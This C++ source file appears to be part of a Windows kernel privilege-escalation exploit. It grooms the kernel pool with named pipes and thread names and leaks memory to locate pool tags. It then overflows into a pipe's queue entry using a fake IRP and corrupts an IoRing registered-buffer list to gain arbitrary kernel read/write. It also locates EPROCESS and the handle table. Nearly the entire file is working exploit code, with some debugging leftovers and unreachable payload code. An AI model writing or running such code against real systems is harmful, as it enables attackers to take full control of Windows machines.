#include "memoryBroker.h"
#include "Hvergelmir.h"
#include "pipeManager.h"
#include "config.h"
#include <algorithm>

namespace
{
    bool ChunkIsAllZero(const BYTE* data, UINT64 size)
    {
        if (!data)
            return false;

        for (UINT64 i = 0; i < size; ++i)
        {
            if (data[i] != 0)
                return false;
        }

        return true;
    }

    bool ChunkHasPipeObject(const BYTE* data, UINT64 size)
    {
        if (!data || size < 4)
            return false;

        for (UINT64 i = 0; i + 4 <= size; ++i)
        {
            if (memcmp(data + i, "PIPE", 4) == 0)
                return true;
        }

        return false;
    }

    bool ChunkHasThreadNameObject(const BYTE* data, UINT64 size)
    {
        if (!data || size < 4)
            return false;

        for (UINT64 i = 0; i + 4 <= size; ++i)
        {
            if (memcmp(data + i, "ThNm", 4) == 0)
                return true;
        }

        return false;
    }

    bool ChunkIsReusableSlot(const BYTE* data, UINT64 size)
    {
        return ChunkIsAllZero(data, size) ||
            ChunkHasPipeObject(data, size) ||
            ChunkHasThreadNameObject(data, size);
    }

    bool HasReusableSlotFrom(const BYTE* leak, UINT64 leakSize, UINT64 startSlot)
    {
        if (!leak || leakSize < CHUNKSIZE)
            return false;

        const UINT64 slotCount = leakSize / CHUNKSIZE;
        for (UINT64 slot = startSlot; slot < slotCount; ++slot)
        {
            const BYTE* chunk = leak + (slot * CHUNKSIZE);
            if (ChunkIsReusableSlot(chunk, CHUNKSIZE))
                return true;
        }

        return false;
    }

    bool AllLeakSlotsFilledIgnoringPipes(const BYTE* leak, UINT64 leakSize)
    {
        return !HasReusableSlotFrom(leak, leakSize, 0);
    }
}


std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
{
    auto nameManagerLocked = nameManager.lock();
    if (!nameManagerLocked) {
        DEBUG_PRINT(" [!] No ThreadNameManager registered\n");
        return std::nullopt;
    }

    auto pipeManagerLocked = pipeManager.lock();
    if (!pipeManagerLocked) {
        DEBUG_PRINT(" [!] No PipeManager available\n");
        return std::nullopt;
    }

    const UINT64 captureAttempts = 24;
    const UINT64 iosbLeaksPerAttempt = 8;
    const UINT64 pipeAttemptsPerIosb = 16;
    const UINT64 pipeLeaksPerAttempt = 4;
    const UINT64 pipeCreateSize = 3000;

    for (UINT64 capture = 0; capture < captureAttempts; ++capture)
    {
        DEBUG_PRINT("\n [*] Pipe layout attempt %llu/%llu\n", (unsigned long long)(capture + 1), (unsigned long long)captureAttempts);

        if (!nameManagerLocked->GetDataLeak(CHUNKSIZE, CHUNKSIZE * 10, 10)) {
            return std::nullopt;
        }

        bool needNewLeak = false;
        UINT64 iosbAttempt = 0;

        while (!needNewLeak)
        {
            DEBUG_PRINT(
                " [*] IoSB attempt %llu for capture %llu\n",
                (unsigned long long)(iosbAttempt + 1),
                (unsigned long long)(capture + 1)
            );

            InvokePrimeOverflow(CHUNKSIZE);

            bool iosbConfirmed = false;
            UINT64 confirmedIosbOffset = 0;
            UINT64 confirmedIosbSlot = 0;
            bool leakSlotsFilledWithoutIosb = false;

            for (UINT64 iosbLeak = 0; iosbLeak < iosbLeaksPerAttempt; ++iosbLeak)
            {
                BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                if (!leakPtr) {
                    DEBUG_PRINT(" [!] Failed to read leak while looking for IoSB on leak %llu\n", (unsigned long long)iosbLeak);
                    continue;
                }

                const UINT64 leakSize = nameManagerLocked->leakSize;
                std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");

                if (!iosbOffsets.empty()) {
                    std::sort(iosbOffsets.begin(), iosbOffsets.end());
                    confirmedIosbOffset = iosbOffsets.front();
                    confirmedIosbSlot = confirmedIosbOffset / CHUNKSIZE;

                    DEBUG_PRINT(
                        " [*] Confirmed %zu IoSB candidates before pipe allocation on capture %llu IoSB attempt %llu leak %llu\n",
                        iosbOffsets.size(),
                        (unsigned long long)capture,
                        (unsigned long long)iosbAttempt,
                        (unsigned long long)iosbLeak
                    );
                    iosbConfirmed = true;
                }
                else if (AllLeakSlotsFilledIgnoringPipes(leakPtr, leakSize)) {
					HexDumpLittleEndian(leakPtr, (size_t)leakSize);
                    DEBUG_PRINT(" [*] Current leak has no IoSB and all non-pipe slots are filled; getting a new leak\n");
                    leakSlotsFilledWithoutIosb = true;
                }

                free(leakPtr);
                if (iosbConfirmed || leakSlotsFilledWithoutIosb)
                    break;
            }

            if (!iosbConfirmed) {
                InvokePassOverflow();
                needNewLeak = leakSlotsFilledWithoutIosb;
                if (!needNewLeak)
                    ++iosbAttempt;
                continue;
            }

            for (UINT64 pipeAttempt = 0; pipeAttempt < pipeAttemptsPerIosb; ++pipeAttempt)
            {
                DEBUG_PRINT(
                    " [*] Pipe allocation attempt %llu/%llu after confirmed IoSB\n",
                    (unsigned long long)(pipeAttempt + 1),
                    (unsigned long long)pipeAttemptsPerIosb
                );

                pipeManagerLocked->CreatePipes(pipeCreateSize);

                for (UINT64 pipeLeak = 0; pipeLeak < pipeLeaksPerAttempt; ++pipeLeak)
                {
                    BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                    if (!leakPtr) {
                        DEBUG_PRINT(" [!] Failed to read leak while looking for pipe on leak %llu\n", (unsigned long long)pipeLeak);
                        continue;
                    }

                    const UINT64 leakSize = nameManagerLocked->leakSize;
                    std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");
                    std::vector<UINT64> npfrOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "NpFr");

                    if (iosbOffsets.empty() || npfrOffsets.empty())
                    {
                        if (!HasReusableSlotFrom(leakPtr, leakSize, confirmedIosbSlot + 1)) {
                            DEBUG_PRINT(" [*] All slots after confirmed IoSB are filled; getting a new leak\n");
                            needNewLeak = true;
                        }

                        free(leakPtr);
                        if (needNewLeak)
                            break;

                        continue;
                    }

                    std::sort(iosbOffsets.begin(), iosbOffsets.end());
                    std::sort(npfrOffsets.begin(), npfrOffsets.end());

                    DEBUG_PRINT(
                        " [*] Same leak has %zu IoSB and %zu NpFr candidates on pipe leak %llu\n",
                        iosbOffsets.size(),
                        npfrOffsets.size(),
                        (unsigned long long)pipeLeak
                    );

                    for (UINT64 iosbOffset : iosbOffsets) {
                        auto npfrIt = std::lower_bound(npfrOffsets.begin(), npfrOffsets.end(), iosbOffset + 1);
                        for (; npfrIt != npfrOffsets.end(); ++npfrIt) {
                            UINT64 npfrOffset = *npfrIt;
                            if (npfrOffset <= iosbOffset) continue;

                            UINT64 pipeBase = (npfrOffset >= 0x4) ? (npfrOffset - 0x4) : 0;
                            if (pipeBase >= leakSize) continue;

                            UINT64 remaining = leakSize - pipeBase;
                            size_t searchSize = (size_t)((remaining < (UINT64)CHUNKSIZE) ? remaining : (UINT64)CHUNKSIZE);
                            if (searchSize == 0) continue;

                            std::vector<UINT64> markerOffsets = ScanForPoolTag(leakPtr + pipeBase, searchSize, "PIPE");
                            if (markerOffsets.empty()) continue;

                            UINT64 absolutePos = pipeBase + markerOffsets.front();
                            const UINT64 indexPos = absolutePos + 4;
                            if (indexPos + sizeof(UINT32) > leakSize) continue;

                            UINT32 pipeIndex = 0;
                            memcpy(&pipeIndex, leakPtr + indexPos, sizeof(pipeIndex));

                            UINT64 distance = pipeBase - iosbOffset;
                            UINT64 desiredEnd = pipeBase + CHUNKSIZE + 0x20;
                            if (desiredEnd > leakSize) desiredEnd = leakSize;
                            if (iosbOffset >= desiredEnd) continue;

                            UINT64 sliceLen = desiredEnd - iosbOffset;

                            LeakLayoutResult result;
                            result.leakedData.resize((size_t)sliceLen);
                            memcpy(result.leakedData.data(), leakPtr + iosbOffset, (size_t)sliceLen);
                            result.targetPipeOffset = distance;
                            result.pipeIndex = pipeIndex;

                            DEBUG_PRINT(
                                " [*] Found layout in same leak: IoSB=%llx NpFr=%llx pipeBase=%llx pipeIndex=%u capture=%llu iosbAttempt=%llu pipeAttempt=%llu pipeLeak=%llu\n",
                                iosbOffset,
                                npfrOffset,
                                pipeBase,
                                pipeIndex,
                                (unsigned long long)capture,
                                (unsigned long long)iosbAttempt,
                                (unsigned long long)pipeAttempt,
                                (unsigned long long)pipeLeak
                            );

                            free(leakPtr);
                            return result;
                        }
                    }

                    if (!HasReusableSlotFrom(leakPtr, leakSize, confirmedIosbSlot + 1)) {
                        DEBUG_PRINT(" [*] All slots after confirmed IoSB are filled; getting a new leak\n");
                        needNewLeak = true;
                    }

                    free(leakPtr);
                    if (needNewLeak)
                        break;
                }

                pipeManagerLocked->ClearPipes();
                if (needNewLeak)
                    break;

                Sleep(50);
            }

            InvokePassOverflow();
            if (!needNewLeak)
                ++iosbAttempt;

            Sleep(50);
        }

        nameManagerLocked->ClearThreads();
        Sleep(100);
    }

    return std::nullopt;
}



bool MemoryBroker::CorruptPipe()
{
    CreateFakeIRP();

    auto layoutOpt = GetPipeLayout();
    if (!layoutOpt) {
        DEBUG_PRINT(" [!] Failed to obtain thread name layout\n");
        return false;
    }


    LeakLayoutResult layout = std::move(*layoutOpt);

    // Validate sizes
    if (layout.leakedData.size() < layout.targetPipeOffset + CHUNKSIZE) {
        DEBUG_PRINT(" [!] leakedData too small for payload copy\n");
        return false;
    }



	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());

    return true;




    // Build payload; use vector to own memory
    std::vector<BYTE> payload((size_t)CHUNKSIZE + 0x20);
    std::fill(payload.begin(), payload.begin() + 0x10, (BYTE)'c');
    memcpy(payload.data() + 0x10, layout.leakedData.data() + layout.targetPipeOffset, (size_t)CHUNKSIZE);

    // Write NP_DATA_QUEUE_ENTRY fields into payload
    NP_DATA_QUEUE_ENTRY* entry = reinterpret_cast<NP_DATA_QUEUE_ENTRY*>(payload.data() + 0x20);
    entry->Irp = fakeIRP;
    entry->EntryType = 0x1;
    __debugbreak();
    DEBUG_PRINT(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
    UINT64 clientManager = 0;
    memcpy(&clientManager, layout.leakedData.data() + layout.targetPipeOffset + 0x10, sizeof(UINT64));

    // Trigger overflow with payload
    InvokeTriggerOverflow(payload.data(), (UINT64)payload.size());

    auto pipeManagerLocked = pipeManager.lock();
    if (!pipeManagerLocked) {
        DEBUG_PRINT(" [!] No PipeManager available for verification\n");
        return false;
    }

    if (!pipeManagerLocked->VerifyCorruption())
    {
        DEBUG_PRINT(" [!] Failed to verify corruption\n");
        return false;
    }

    return true;
}





bool MemoryBroker::FindEPROCESS(UINT64 iClientManager)
{
    DEBUG_PRINT("\n [*] ###### Locating EPROCESS and OBJECT_TABLE ######\n");

	if (iClientManager == 0) {
		DEBUG_PRINT(" [!] Invalid client manager pointer (0)\n");
		return false;
	}

	UINT64 fileObject = 0;
	Read(&fileObject, iClientManager - 0x10, sizeof(UINT64));
	if (fileObject == 0) {
		DEBUG_PRINT(" [!] Failed to read FILE_OBJECT from client manager\n");
		return false;
	}

	UINT64 eprocess = 0;
	// guard against underflowed or small addresses
	if (fileObject <= 0x1000) {
		DEBUG_PRINT(" [!] FILE_OBJECT looks invalid: %p\n", (void*)fileObject);
		return false;
	}

	Read(&eprocess, fileObject - 0x40, sizeof(UINT64));
	if (eprocess == 0) {
		DEBUG_PRINT(" [!] Failed to read EPROCESS from FILE_OBJECT\n");
		return false;
	}

	DEBUG_PRINT("     Found EPROCESS: %p\n", (void*)eprocess);

	UINT64 handleTableLocal = 0;
	Read(&handleTableLocal, eprocess + 0x300, sizeof(UINT64));
	if (handleTableLocal == 0) {
		DEBUG_PRINT(" [!] Failed to read HANDLE_TABLE from EPROCESS\n");
		return false;
	}

	this->HANDLE_TABLE = handleTableLocal;
	DEBUG_PRINT("     Found HANDLE_TABLE: %p\n", (void*)this->HANDLE_TABLE);

	return true;
}


bool MemoryBroker::GetIORingLayout()
{
	bool correctLayout = false;

    auto ioRingManagerLocked = ioRingManager.lock();


    while (!correctLayout)
    {
        ioRingManagerLocked->CreateRings(1000);
        InvokePrimeOverflow(IORING_CHUNK_SIZE);

        for (UINT64 i = 0; i < ioRingManagerLocked->ioRingCount; ++i)
        {
            targetRingAddr = HandleToPointer(*(HANDLE*)ioRingManagerLocked->ioRings[i]) - 0x60;

            UINT64 adjacentData;
            Read(&adjacentData, targetRingAddr - 0x20, sizeof(UINT64));

            if (adjacentData == 0x6161616161616161)
            {
                ioRingManagerLocked->corruptedRing = ioRingManagerLocked->ioRings[i];
                correctLayout = true;
                break;
            }
        }

        if (!correctLayout)
        {
            ioRingManagerLocked->ClearRings();
            InvokePassOverflow();
        }
    }
	if (!correctLayout) {
        DEBUG_PRINT(" [!] Failed to find correct IoRing layout\n");
        return false;
    }

    return true;
}


bool MemoryBroker::CorruptIoRing()
{
	if (!targetRingAddr) {
        DEBUG_PRINT(" [!] targetRingAddr not set, cannot corrupt IoRing\n");
        return false;
    }

    UINT64 originalRegBufferList;
    Read(&regBuffersListAddr, targetRingAddr + 0x118, sizeof(UINT64));
    if (!regBuffersListAddr) {
        DEBUG_PRINT(" [!] Failed to read regBuffersListAddr from IoRing\n");
        return false;
	}

    UINT64 regBufferAddr;
    Read(&regBufferAddr, regBuffersListAddr, sizeof(UINT64));
    if (!regBufferAddr) {
        DEBUG_PRINT(" [!] Failed to read regBufferAddr from regBuffersList\n");
        return false;
    }

    BYTE* regBufferContent = new BYTE[0x80];
    Read((UINT64*)regBufferContent, regBufferAddr, 0x80);


    CreateFakeRegBuffer(regBufferContent);

    BYTE* ioRingPayload = new BYTE[IORING_CHUNK_SIZE + 0x10];
    memset(ioRingPayload, 'c', 0x10);

    Read((UINT64*)(ioRingPayload + 0x10), targetRingAddr, IORING_CHUNK_SIZE);

    *(UINT64*)(ioRingPayload + 0x118 + 0x10) = (UINT64)&fakeRegBuffer;
    *(UINT32*)(ioRingPayload + 0x110 + 0x10) = (UINT32)0x1;

    InvokeTriggerOverflow(ioRingPayload, IORING_CHUNK_SIZE + 0x10);

    return true;
}


bool MemoryBroker::Cleanup()
{

    auto pipeManagerLocked = pipeManager.lock();
    auto nameManagerLocked = nameManager.lock();

    UINT64 corruptPipeClient;
    UINT64 corruptPipeFileObject = HandleToPointer(pipeManagerLocked->corruptedPipe);
    if (!corruptPipeFileObject) {
        DEBUG_PRINT(" [!] Failed to get file object for corrupted pipe\n");
        return false;
	}

    for (int i = 0; i < 100; i++)
    {
        Read(&corruptPipeClient, corruptPipeFileObject + 0x20, sizeof(UINT64));
        if (corruptPipeClient != 0x0)
            break;
    }
    corruptPipeClient &= 0xfffffffffffffff0;

    UINT64 corruptPipeAddr;
    Read(&corruptPipeAddr, corruptPipeClient + 0x48, sizeof(UINT64));
	if (!corruptPipeAddr) {
        DEBUG_PRINT(" [!] Failed to get kernel address for corrupted pipe\n");
        return false;
    }

    Write((BYTE*)(corruptPipeAddr + 0x10), 0, 0x8);
    Write((BYTE*)(corruptPipeAddr + 0x20), 0, 0x4);
    Write((BYTE*)(targetRingAddr + 0x118), regBuffersListAddr, 0x8);

    nameManagerLocked->ClearThreads();

}
